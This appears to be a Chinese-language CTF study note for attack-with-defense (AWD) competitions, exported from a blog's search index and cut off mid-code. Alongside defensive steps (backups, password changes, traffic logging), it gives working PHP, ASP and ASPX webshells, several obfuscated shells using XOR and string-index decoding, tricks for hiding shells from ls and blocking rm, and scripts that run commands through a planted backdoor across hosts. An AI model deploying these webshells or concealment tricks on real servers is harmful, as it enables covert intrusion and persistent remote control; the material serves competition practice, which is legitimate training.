<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>test2</title>
    <link href="/2024/03/25/test2/"/>
    <url>/2024/03/25/test2/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="AWD"><a href="#AWD" class="headerlink" title="AWD"></a>AWD</h1><p><img src="D:/bk/blog/source/pic/image-20230514181816237.png" alt="image-20230514181816237"></p><p># 前期准备</p><p>## SSH登录</p><p>口令登录</p><p>命令格式为： ssh 客户端用户名@服务器ip地址</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> 用户名<span class="hljs-variable">@ip</span><br>ssh ctf@<span class="hljs-number">192.168.182.130</span><br></code></pre></td></tr></table></figure><p>如果不是默认的22端口，也可以使用 -p 选项来修改端口号，比如连接到服务器的2222端口</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> -p 指定端口号 用户名<span class="hljs-variable">@ip</span><br>ssh -p <span class="hljs-number">2222</span> ctf@<span class="hljs-number">192.168.182.130</span><br></code></pre></td></tr></table></figure><p>除此之外还可以使用Finalshell或者Xshell等图形化服务器管理软件</p><p><strong>密钥登录</strong><br>用id_rsa用于登陆靶机，命令如下</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">sftp -<span class="hljs-selector-tag">i</span> id_rsa ctf<span class="hljs-keyword">@192</span>.168.182.130<br></code></pre></td></tr></table></figure><h2 id="改密码"><a href="#改密码" class="headerlink" title="改密码"></a>改密码</h2><p>官方在给出服务器密码时，很有可能是默认的，那就需要赶快修改自己的密码，但一般主办方给的是随机密码。</p><p>如果发现每个队伍的SSH账号密码都是一样的，需要立即修改口令，如果被其他队伍改了那就gg了，同时要准备好批量脚本，一旦是默认密码，可以直接利用。</p><p>SSH密码修改:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">passwd</span><br></code></pre></td></tr></table></figure><p>mysql密码修改:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">#方法一<br><span class="hljs-keyword">show</span> databases;<br>use mysql<br><span class="hljs-keyword">set</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">for</span> root@localhost = <span class="hljs-keyword">password</span>(<span class="hljs-string">&#x27;123&#x27;</span>);<br>#方法二<br><span class="hljs-keyword">update</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">set</span> <span class="hljs-keyword">password</span> = <span class="hljs-keyword">PASSWORD</span>(<span class="hljs-string">&#x27;需要更换的密码&#x27;</span>) <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span>=<span class="hljs-string">&#x27;root&#x27;</span>;<br>flush <span class="hljs-keyword">privileges</span>;<br><span class="hljs-keyword">show</span> <span class="hljs-keyword">tables</span>;<br></code></pre></td></tr></table></figure><p>Web后台很有可能存在弱口令，需要立即修改，也可以修改其他队伍的后台口令，为本队所用，说不定可以利用后台getshell。</p><p>大多数情况下，所有队伍的Web后台、phpmyadmin等服务的管理密码都一样，立马快速检查修改自己密码，并利用此进行攻击。一般默认密码为 <code>admin/admin, admin/123456, test/test</code>，如果被其他队伍改了那就gg了。</p><p>数据库我们如何来找到账号密码，我们可以查看相关的配置文件：</p><p><img src="D:/bk/blog/source/pic/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcnVpaGFjaw==,size_17,color_FFFFFF,t_70,g_se,x_16.png" alt="img"></p><p>我们在config.php中找到了数据库的账号和密码。</p><p>我们使用数据库连接看一下：</p><p> <img src="D:/bk/blog/source/pic/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcnVpaGFjaw==,size_20,color_FFFFFF,t_70,g_se,x_16.png" alt="img"></p><p>果然连接成功，随后加固数据库就好了。</p><h2 id="备份源码"><a href="#备份源码" class="headerlink" title="备份源码"></a>备份源码</h2><p>比赛开始后第一时间备份服务器中web目录下的文件(&#x2F;var&#x2F;www&#x2F;html)，备份的目的在于万一对方利用漏洞进入你的靶机将你的WWW下的目录给删除了，可以及时恢复，如果你没有备份就相当于宕机了</p><p>比赛开始第一时间备份，备份网站目录及数据库，一般在 &#x2F;var&#x2F;www&#x2F;html 目录。</p><p>1.目录打包</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">打包<br>tar -zcvf archive_name.tar.gz  directory_to_compress<br>注意：如果使用tar命令打包文件夹，<span class="hljs-string">.index.php</span>（隐藏类型文件）将不会被打包，若无权限换到有权限的文件夹中<br><br>备份整站<br><span class="hljs-keyword">cd</span> <span class="hljs-string">/var/www</span> &amp;&amp; tar -czvf <span class="hljs-string">/tmp/html.tgz</span> html<br><span class="hljs-comment"># 软连接到了/app</span><br><span class="hljs-keyword">cd</span> / &amp;&amp; tar -czvf <span class="hljs-string">/tmp/app.tgz</span> app<br><br>解包<br>tar -zxvf archive_name.tar.gz<br></code></pre></td></tr></table></figure><p>2.备份数据库</p><ul><li>备份指定的多个数据库</li></ul><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">mysqldump -uroot -proot <span class="hljs-params">--databases</span> DB1 DB2 &gt; <span class="hljs-string">/tmp/db.sql</span><br></code></pre></td></tr></table></figure><p>无 lock tables 权限的解决方法</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">mysqldump -uroot -proot <span class="hljs-params">--all-databases</span> <span class="hljs-params">--skip-lock-tables</span> &gt; <span class="hljs-string">/tmp/db.sql</span><br></code></pre></td></tr></table></figure><ul><li>恢复备份（在 MySQL 终端下执行）</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">source</span> FILE_PATH<br></code></pre></td></tr></table></figure><ul><li>重置 MySQL 密码（在 MySQL 终端下执行）</li></ul><p>方法 1</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">set</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">for</span> 用户名@localhost = <span class="hljs-keyword">password</span>(&quot;新密码&quot;)<br></code></pre></td></tr></table></figure><p>方法 2</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">mysqladmin -u用户名 -<span class="hljs-selector-tag">p</span>旧密码 password 新密码<br></code></pre></td></tr></table></figure><p>3.下载到本地</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">scp -P ssh_port user<span class="hljs-variable">@host_ip</span><span class="hljs-symbol">:/tmp/bak</span>.sql local_file<br><br></code></pre></td></tr></table></figure><h2 id="数据备份"><a href="#数据备份" class="headerlink" title="数据备份"></a>数据备份</h2><p>数据库配置信息一般可以通过如config.php&#x2F;web.conf等文件获取。<br>以MySQL数据库备份数据为例：</p><p>备份指定数据库：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">mysqldump –u username –p <span class="hljs-keyword">password</span> databasename &gt; bak.<span class="hljs-keyword">sql</span><br></code></pre></td></tr></table></figure><p>备份所有数据库：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">mysqldump –<span class="hljs-keyword">all</span> -databases &gt; bak.<span class="hljs-keyword">sql</span><br></code></pre></td></tr></table></figure><p>导入数据库：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">mysql –u username –p <span class="hljs-keyword">password</span> <span class="hljs-keyword">database</span> &lt; bak.<span class="hljs-keyword">sql</span><br></code></pre></td></tr></table></figure><h2 id="查找预留后门"><a href="#查找预留后门" class="headerlink" title="查找预留后门"></a>查找预留后门</h2><p>用D盾扫描备份的文件，查找预留后门，第一时间删除自己靶机上的后门，也可以利用后门攻击其他靶机。</p><p>可以使用 seay进行代码审计</p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>端口扫描是信息收集的一部分，需要知道目标服务器开放了哪些端口，使用端口扫描工具有御剑高速TCP全端口扫描工具、nmap和masscan等进行扫描。<br>所有服务器配置都是一样的，也可以看己方靶机开放了哪些端口。</p><p>以下是一些服务端口的漏洞：<br>22：ssh弱口令<br>873：未授权访问漏洞<br>3306：mysql弱口令<br>6379：redis未授权访问漏洞</p><h2 id="常用Linux命令"><a href="#常用Linux命令" class="headerlink" title="常用Linux命令"></a>常用Linux命令</h2><p>ssh &lt;-p 端口&gt; 用户名@IP　　<br>scp 文件路径  用户名@IP:存放路径　　　　<br>tar -zcvf web.tar.gz &#x2F;var&#x2F;www&#x2F;html&#x2F;　　<br>w 　　　　<br>pkill -kill -t &lt;用户tty&gt;　　 　　<br>ps aux | grep pid或者进程名　</p><p>#查看已建立的网络连接及进程<br>netstat -antulp | grep EST</p><p>#查看指定端口被哪个进程占用<br>lsof -i:端口号 或者 netstat -tunlp|grep 端口号</p><p>#结束进程命令<br>kill PID<br>killall &lt;进程名&gt;　　<br>kill - <PID>　　</p><p>#封杀某个IP或者ip段，如：.　　<br>iptables -I INPUT -s . -j DROP<br>iptables -I INPUT -s .&#x2F; -j DROP</p><p>#禁止从某个主机ssh远程访问登陆到本机，如123..　　<br>iptable -t filter -A INPUT -s . -p tcp –dport  -j DROP</p><p>#检测所有的tcp连接数量及状态<br>netstat -ant|awk  |grep |sed -e  -e |sort|uniq -c|sort -rn</p><p>#查看页面访问排名前十的IP<br>cat &#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log | cut -f1 -d   | sort | uniq -c | sort -k  -r | head -　　</p><p>#查看页面访问排名前十的URL<br>cat &#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log | cut -f4 -d   | sort | uniq -c | sort -k  -r | head -</p><h2 id="流量监控"><a href="#流量监控" class="headerlink" title="流量监控"></a>流量监控</h2><p>流量监控也是可以使用aoiawd进行，aoiawd还是在后边，或者用别的脚本记录流量，有的比赛也会定时提供上阶段流量</p><p>被上马一定要先备份到本地，再删除、去分析反打别人</p><p>php流量监控<br>&lt;?php</p><p>date_default_timezone_set(‘Asia&#x2F;Shanghai’);</p><p>$ip &#x3D; $_SERVER[“REMOTE_ADDR”]; &#x2F;&#x2F;记录访问者的ip</p><p>$filename &#x3D; $_SERVER[‘PHP_SELF’]; &#x2F;&#x2F;访问者要访问的文件名</p><p>$parameter &#x3D; $_SERVER[“QUERY_STRING”]; &#x2F;&#x2F;访问者要请求的参数</p><p>$time &#x3D; date(‘Y-m-d H:i:s’,time()); &#x2F;&#x2F;访问时间</p><p>$logadd &#x3D; ‘来访时间：’.$time.’–&gt;’.’访问链接：’.’http:&#x2F;&#x2F;‘.$ip.$filename.’?’.$parameter.”\r\n”;</p><p>&#x2F;&#x2F; log记录</p><p>$fh &#x3D; fopen(“log.txt”, “a”);</p><p>fwrite($fh, $logadd);</p><p>fclose($fh);</p><p>?&gt;<br>wireshark<br>过滤IP地址<br>(1) ip.addr &#x3D;&#x3D; 192.168.1.1 &#x2F;&#x2F;只显示源&#x2F;目的IP为192.168.1.1的数据包<br>(2) not ip.src &#x3D;&#x3D; 1.1.1.1 &#x2F;&#x2F;不显示源IP为1.1.1.1的数据包<br>(3) ip.src &#x3D;&#x3D; 1.1.1.1 or ip.dst &#x3D;&#x3D; 1.1.1.2 &#x2F;&#x2F;只显示源IP为1.1.1.1或目的IP为1.1.1.2的数据包<br>过滤端口<br>(1) tcp.port eq 80 #不管端口是来源还是目的都显示80端口<br>(2) tcp.port &#x3D;&#x3D; 80<br>(3) tcp.port eq 2722<br>(4) tcp.port eq 80 or udp.port eq 80<br>(5) tcp.dstport &#x3D;&#x3D; 80 #只显示tcp协议的目标端口80<br>(6) tcp.srcport &#x3D;&#x3D; 80 #只显示tcp协议的来源端口80<br>(7) udp.port eq 15000<br>(8) tcp.port &gt;&#x3D; 1 and tcp.port &lt;&#x3D; 80 #过滤端口范围<br>过滤MAC地址<br>(1) eth.dst &#x3D;&#x3D; MAC地址 #过滤目标MAC<br>(2) eth.src eq MAC地址 #过滤来源MAC<br>(3)eth.addr eq MAC地址 #过滤来源MAC和目标MAC都等于MAC地址的<br>http请求方式过滤<br>(1) http.request.method &#x3D;&#x3D; “GET”<br>(2) http.request.method &#x3D;&#x3D; “POST”<br>(3) http.host mathes “<a href="http://www.baidu.com|http://baidu.cn“">www.baidu.com|http://baidu.cn“</a> #matches可以写多个域名<br>(4) http.host contains “<a href="http://www.baidu.com“/">http://www.baidu.com“</a> #contain只能写一个域名<br>(5) http contains “GET” 例如： http.request.method &#x3D;&#x3D;”GET” &amp;&amp; http contains “Host: “ http.request.method &#x3D;&#x3D; “GET” &amp;&amp; http contains “User-Agent: “ http.request.method &#x3D;&#x3D;”POST” &amp;&amp; http contains “Host: “ http.request.method &#x3D;&#x3D; “POST” &amp;&amp; http contains “User-Agent: “ http contains “HTTP&#x2F;1.1 200 OK” &amp;&amp; http contains “Content-Type: “ http contains “HTTP&#x2F;1.0 200 OK” &amp;&amp; http contains “Content-Type: “<br>端口过滤<br>抓取所有经过ens33，目的或源端口22的网络数据：<br>tcpdump -i ens33 port 22<br>指定源端口：tcpdump -i ens33 sec port 22<br>指定目的端口: tcpdump -i ens33 dst port 22<br>网络过滤<br>tcpdump -i ens33 net 192.168.1.1<br>tcpdump -i ens33 src net 192.168.1.1 #源端口<br>tcpdump -i ens33 dst net 192.168.1.1 #目的端口<br>协议过滤<br>tcpdump -i ens33 arp<br>tcpdump -i ens33 ip<br>tcpdump -i ens33 tcp<br>tcpdump -i ens33 udp<br>tcpdump -i ens33 icmp<br>tcpdump -w 1.pcap #抓所有包保存到1.pcap中然后使用wireshark分析</p><h2 id="awd中linux的命令"><a href="#awd中linux的命令" class="headerlink" title="awd中linux的命令"></a>awd中linux的命令</h2><ul><li><p>netstat -anptl 查看开放端口</p></li><li><p>ps aux 以用户为主的格式来查看所有进程</p><p>pa aux | grep tomcat</p><p>ps -A 显示进程信息</p><p>ps -u root 显示root进程用户信息</p><p>ps -ef 显示所有命令，连带命令行</p></li><li><p>kill 终止进程</p><p>kill -9 pid</p><p>&#x2F;&#x2F;kill -15、kill -9的区别</p><p>执行kill（默认kill -15）命令，执行kill (默认kill-15) 命令，系统会发送一个SIGTERM信号给对应的程序，,大部分程序接收到SIGTERM信号后，会先kill -9命令,系统给对应程序发送的信号是SIGKILL,即exit。exit信号不会被系统阻塞，所以kill -9能顺利杀掉进程</p></li><li><p>vim编辑器</p><p>命令行模式下</p><p>&#x2F;  查找内容</p><p>?  查找内容</p><p>n  重复上一条检索命令</p><p>N  命令重复上一条检索命令</p></li></ul><h1 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p>信息收集</p><ul><li>nmap、Routescan</li><li>Python 脚本</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">255</span>): <br>    url = <span class="hljs-string">&quot;http://192.168.1.&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(x) <br>    <span class="hljs-keyword">try</span>: <br>        r = requests.post(url) <br>        <span class="hljs-built_in">print</span>(url) <br>        <span class="hljs-keyword">except</span>: <br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><h2 id="后门利用"><a href="#后门利用" class="headerlink" title="后门利用"></a>后门利用</h2><p>curl读flag</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">C:\Users\admin&gt;<span class="hljs-built_in">curl</span> <span class="hljs-string">&quot;http://192.168.182.130:8801/include/shell.php&quot;</span> <span class="hljs-literal">-d</span> <span class="hljs-string">&quot;admin_ccmd=system(&#x27;cat /f*&#x27;);&quot;</span><br><span class="hljs-built_in">SL</span>&#123;<span class="hljs-number">4</span>a0be463dd85555090f2216795677916d2447242&#125;<br>flag&#123;glzjin_wants_a_girl_friend&#125;<br></code></pre></td></tr></table></figure><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python">端口<br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">import</span> requests<br>url_head=<span class="hljs-string">&quot;http://192.168.182.130&quot;</span>   <span class="hljs-comment">#网段</span><br>url=<span class="hljs-string">&quot;&quot;</span><br>shell_addr=<span class="hljs-string">&quot;/upload/url/shell.php&quot;</span> <span class="hljs-comment">#木马路径</span><br>passwd=<span class="hljs-string">&quot;pass&quot;</span>                   <span class="hljs-comment">#木马密码</span><br><span class="hljs-comment">#port=&quot;80&quot;</span><br>payload = &#123;passwd: <span class="hljs-string">&#x27;System(\&#x27;cat /flag\&#x27;);&#x27;</span>&#125;<br><span class="hljs-comment"># find / -name &quot;flag*&quot;</span><br><br><span class="hljs-comment">#清空上次记录</span><br>flag=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>)<br>flag.close()<br><br>flag=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>)<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8000</span>,<span class="hljs-number">8004</span>):<br>    url=url_head+<span class="hljs-string">&quot;:&quot;</span>+<span class="hljs-built_in">str</span>(i)+shell_addr<br>    <span class="hljs-keyword">try</span>:<br>        res=requests.post(url,payload)<span class="hljs-comment">#,timeout=1</span><br>        <span class="hljs-keyword">if</span> res.status_code == requests.codes.ok:<br>            result = res.text<br>            <span class="hljs-built_in">print</span> (result)<br>            flag.write(result+<span class="hljs-string">&quot;\n&quot;</span>) <br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;shell 404&quot;</span>)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span> (url+<span class="hljs-string">&quot; connect shell fail&quot;</span>)<br><br>flag.close()<br></code></pre></td></tr></table></figure><h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><p>常用语言的一句话木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">php： <span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]);<span class="hljs-meta">?&gt;</span>      <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]);<br>asp：   &lt;%<span class="hljs-keyword">eval</span> <span class="hljs-title function_ invoke__">request</span> (<span class="hljs-string">&quot;pass&quot;</span>)%&gt;<br>aspx：  &lt;%@ Page Language=<span class="hljs-string">&quot;Jscript&quot;</span>%&gt; &lt;%<span class="hljs-keyword">eval</span>(Request.Item[<span class="hljs-string">&quot;pass&quot;</span>],<span class="hljs-string">&quot;unsafe&quot;</span>);%&gt;<br></code></pre></td></tr></table></figure><p>蚁剑连接get型木马，之前一直不会用蚁剑连接get型木马，这里记录一下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]);<br><br>/shell.php?pass=<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<br>连接密码：<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h2 id="隐藏shell"><a href="#隐藏shell" class="headerlink" title="隐藏shell"></a>隐藏shell</h2><p>shell很容易被发现，被删除就gg了，可以采用一些操作隐藏shell或使shell无法被删除</p><p><strong>1.把shell.php命名为.shell.php</strong></p><p>.shell.php在执行ls时无法被查看到，搭配ls的参数才能被发现<br>完整命令如下</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[sss@ecs-centos-7 awd]</span>$ echo <span class="hljs-string">&quot;iamshell&quot;</span>&gt;shell<span class="hljs-selector-class">.php</span><br><span class="hljs-selector-attr">[sss@ecs-centos-7 awd]</span>$ ls<br>shell<span class="hljs-selector-class">.php</span><br><span class="hljs-selector-attr">[sss@ecs-centos-7 awd]</span>$ mv shell<span class="hljs-selector-class">.php</span> <span class="hljs-selector-class">.shell</span><span class="hljs-selector-class">.php</span><br><span class="hljs-selector-attr">[sss@ecs-centos-7 awd]</span>$ ls<br><span class="hljs-selector-attr">[sss@ecs-centos-7 awd]</span>$ ls -al<br>总用量 <span class="hljs-number">12</span><br>drwxrwxr-x <span class="hljs-number">2</span> sss sss <span class="hljs-number">4096</span> <span class="hljs-number">12</span>月  <span class="hljs-number">29</span> <span class="hljs-number">22</span>:<span class="hljs-number">52</span> .<br>drwx------ <span class="hljs-number">4</span> sss sss <span class="hljs-number">4096</span> <span class="hljs-number">12</span>月  <span class="hljs-number">29</span> <span class="hljs-number">22</span>:<span class="hljs-number">51</span> ..<br>-rw-rw-r-- <span class="hljs-number">1</span> sss sss    <span class="hljs-number">9</span> <span class="hljs-number">12</span>月  <span class="hljs-number">29</span> <span class="hljs-number">22</span>:<span class="hljs-number">52</span> <span class="hljs-selector-class">.shell</span>.php<br></code></pre></td></tr></table></figure><p><strong>2.把shell.php命名为-shell.php</strong><br>从上面可以看出，ls加参数才能查看到shell，那么我们直接写一个-shell.php、<br>命令行会把-后面的内容当成参数执行，执行即使被发现，使用rm命令进行删除，会被当成是rm的参数，就会发生报错，无法删除shell，目的也达到了</p><p>完整命令如下</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stata">[sss@ecs-centos-7 awd]$ <span class="hljs-keyword">ls</span><br>-<span class="hljs-keyword">shell</span>.php<br>[sss@ecs-centos-7 awd]$ <span class="hljs-keyword">rm</span> -<span class="hljs-keyword">shell</span>.php <br><span class="hljs-keyword">rm</span>：无效选项 -- s<br>Try &#x27;<span class="hljs-keyword">rm</span> ./-<span class="hljs-keyword">shell</span>.php&#x27; to remove the <span class="hljs-keyword">file</span> <span class="hljs-string">&quot;-shell.php&quot;</span>.<br>Try &#x27;<span class="hljs-keyword">rm</span> --<span class="hljs-keyword">help</span>&#x27; <span class="hljs-keyword">for</span> <span class="hljs-keyword">more</span> information.<br>[sss@ecs-centos-7 awd]$ <span class="hljs-keyword">rm</span> -rf -<span class="hljs-keyword">shell</span>.php <br><span class="hljs-keyword">rm</span>：无效选项 -- s<br>Try &#x27;<span class="hljs-keyword">rm</span> ./-<span class="hljs-keyword">shell</span>.php&#x27; to remove the <span class="hljs-keyword">file</span> <span class="hljs-string">&quot;-shell.php&quot;</span>.<br>Try &#x27;<span class="hljs-keyword">rm</span> --<span class="hljs-keyword">help</span>&#x27; <span class="hljs-keyword">for</span> <span class="hljs-keyword">more</span> information.<br></code></pre></td></tr></table></figure><h2 id="特殊的shell"><a href="#特殊的shell" class="headerlink" title="特殊的shell"></a>特殊的shell</h2><p>shell1：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> (<span class="hljs-variable">$_</span>=@<span class="hljs-variable">$_GET</span>[<span class="hljs-number">2</span>]).@<span class="hljs-variable">$_</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>])<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>连接方式：php?2&#x3D;assert密码是1。</p><p>shell2：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">chr</span>( <span class="hljs-number">96</span>^<span class="hljs-number">5</span>);<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">chr</span>( <span class="hljs-number">57</span>^<span class="hljs-number">79</span>);<br><span class="hljs-variable">$c</span>=<span class="hljs-title function_ invoke__">chr</span>( <span class="hljs-number">15</span>^<span class="hljs-number">110</span>);<br><span class="hljs-variable">$d</span>=<span class="hljs-title function_ invoke__">chr</span>( <span class="hljs-number">58</span>^<span class="hljs-number">86</span>);<br><span class="hljs-variable">$e</span>= <span class="hljs-string">&#x27;($_REQUEST[C])&#x27;</span>;<br>@<span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-variable">$a</span>.<span class="hljs-variable">$b</span>.<span class="hljs-variable">$c</span>.<span class="hljs-variable">$d</span>.<span class="hljs-variable">$e</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>配置为?b&#x3D;))99(rhC(tseuqeR+lave</p><p>shell3：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$sF</span>= <span class="hljs-string">&quot;PCT4BA6ODSE_&quot;</span>;<span class="hljs-variable">$s21</span>=<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$sF</span>[<span class="hljs-number">4</span>].<span class="hljs-variable">$sF</span>[<span class="hljs-number">5</span>].<span class="hljs-variable">$sF</span>[<span class="hljs-number">9</span>].<span class="hljs-variable">$sF</span>[<span class="hljs-number">10</span>].<span class="hljs-variable">$sF</span>[<span class="hljs-number">6</span>].<span class="hljs-variable">$sF</span>[<span class="hljs-number">3</span>].<span class="hljs-variable">$sF</span>[<span class="hljs-number">11</span>].<span class="hljs-variable">$sF</span>[<span class="hljs-number">8</span>].<span class="hljs-variable">$sF</span>[<span class="hljs-number">10</span>].<span class="hljs-variable">$sF</span>[<span class="hljs-number">1</span>].<span class="hljs-variable">$sF</span>[<span class="hljs-number">7</span>].<span class="hljs-variable">$sF</span>[<span class="hljs-number">8</span>].<span class="hljs-variable">$sF</span>[<span class="hljs-number">10</span>]);<span class="hljs-variable">$s22</span>=$&#123;<span class="hljs-title function_ invoke__">strtoupper</span>(<span class="hljs-variable">$sF</span>[<span class="hljs-number">11</span>].<span class="hljs-variable">$sF</span>[<span class="hljs-number">0</span>].<span class="hljs-variable">$sF</span>[<span class="hljs-number">7</span>].<span class="hljs-variable">$sF</span>[<span class="hljs-number">9</span>].<span class="hljs-variable">$sF</span>[<span 